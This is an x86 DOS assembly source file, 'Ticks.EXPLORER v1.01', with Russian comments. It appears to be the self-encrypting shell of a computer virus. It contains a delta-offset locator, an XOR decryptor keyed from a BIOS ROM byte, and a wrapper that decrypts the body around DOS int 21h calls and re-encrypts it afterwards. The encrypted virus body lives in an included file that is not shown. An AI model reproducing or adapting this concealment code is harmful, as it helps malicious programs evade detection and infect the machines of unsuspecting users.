;************************************************
;*	Ticks.EXPLORER v1.01                    *
;************************************************
.286
TestS	segment
	assume	cs:TestS,ds:TestS,ss:TestS
	org	100h
;
Shift	= ((Next-Start)+100h)	
CryptLen= CopyRT-Crypted
;
Start:
	call	Next
Next:
	pop	si
	sub	si,Shift
	call	Crypt	
;
Crypted:
;************************************************
	include	trexp.inc ; Зашифровано         *
;************************************************
CopyRT	db	0,'[Tricks.EXPLORER] v1.01',0
;
WriV:
	call	Crypt
	int	21h
	call	Crypt
	ret
;************************************************
;*	Расшифровщик                            * 
;************************************************
Crypt:
	pusha
	lea	bx, Crypted[si]
	mov	cx, CryptLen
; Извлекаем из BIOS константу 2Fh	 
	push	ds                       
	mov	ax, 0F000h               
	mov	ds, ax                   
	mov	al, byte ptr ds:[0FFF7h] 
	pop	ds                       
; Генерируем 55h
	add	al, (55h-2Fh)
Circle:	
	xor	byte ptr [bx], al
	inc	bx
	loop	Circle
	popa
	ret
;
Finish:
;
Tests	ends
	End	Start